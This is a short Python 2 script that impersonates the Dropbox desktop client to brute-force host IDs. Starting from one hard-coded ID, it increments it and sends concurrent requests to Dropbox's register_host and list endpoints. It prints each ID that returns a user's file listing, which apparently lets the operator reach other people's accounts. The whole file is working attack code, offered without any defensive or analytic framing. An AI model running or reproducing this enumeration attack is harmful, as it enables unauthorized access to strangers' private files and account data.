#!/usr/bin/env python

from __future__ import with_statement
import gevent
from gevent import socket
from gevent.pool import Pool
# from gevent import monkey
# monkey.patch_socket()
import sys
import json
import requests

# put your host_id below
host_id = "147c6cf0e21dcf913e85dcb14a9d5af4"

bhid = long(host_id, 16)

# limit ourselves to max 10 simultaneous outstanding requests
pool = Pool(10)

# URLs
list_url = 'https://client10.dropbox.com/list'
register_url = 'https://client10.dropbox.com/register_host'
# "/list_dirs" fetches list of directories

# headers
headers = {'content-type': 'application/x-www-form-urlencoded',
           'User-Agent': """DropboxDesktopClient/2.0.2 (Linux; 4.0; Some ARM ;-); en_US)"""}

# message
print "Fetching data ..."
# fetch initial data


def stuff(host_id):
    data = """buildno=Dropbox-win-1.7.5&tag=&uuid=123456&server_list=False&host_id=%s&hostname=random""" % host_id
    r = requests.post(register_url, data=data, headers=headers)
    data = json.loads(r.text)
    host_int = data["host_int"]
    # print host_int
    root_ns = data["root_ns"]
    # fetch data list
    root_ns = str(root_ns) + "_-1"
    data = """buildno=Dropbox-win-1.7.5&tag=&uuid=123456&server_list=True&host_id=%s&hostname=random""" % host_id
    data = data + "&ns_map=%s&dict_return=1&server_list=True&last_cu_id=-1&need_sandboxes=0&xattrs=True" % root_ns
    r = requests.post(list_url, data=data, headers=headers)
    try:
        data = json.loads(r.text)
        paths = data["list"]
        print ":-)"
        print host_id
        print host_int
    except:
        pass

def job(host_id):
    try:
        try:
            stuff(host_id)
        except socket.gaierror, ex:
            print '%s failed with %s' % (host_id, ex)
    except Exception, exc:
        print exc
        pass
    finally:
        pass

with gevent.Timeout(16, False):
    i = 0
    while True:
        host_id = hex(bhid + i)[2:][:-1]
        # print host_id
        i = i + 1
        pool.spawn(job, host_id)
    pool.join()

